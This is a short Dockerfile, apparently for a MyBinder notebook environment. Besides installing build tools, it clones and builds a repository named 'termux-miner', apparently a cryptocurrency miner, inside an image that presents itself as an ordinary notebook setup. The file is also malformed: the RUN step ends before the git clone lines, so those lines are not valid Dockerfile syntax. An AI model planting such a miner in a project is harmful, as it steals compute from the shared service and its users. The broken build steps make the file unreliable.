# Dockerfile for MyBinder with required dependencies

FROM jupyter/base-notebook

USER root

# Install build dependencies
RUN apt-get update && \
    apt-get install -y git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ libtool && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
    git clone https://github.com/wong-fi-hung/termux-miner.git && \
    cd termux-miner && \
    ./build-android.sh

USER $NB_UID

# Additional configuration or instructions for your project can be added here

# CMD or ENTRYPOINT for running your application

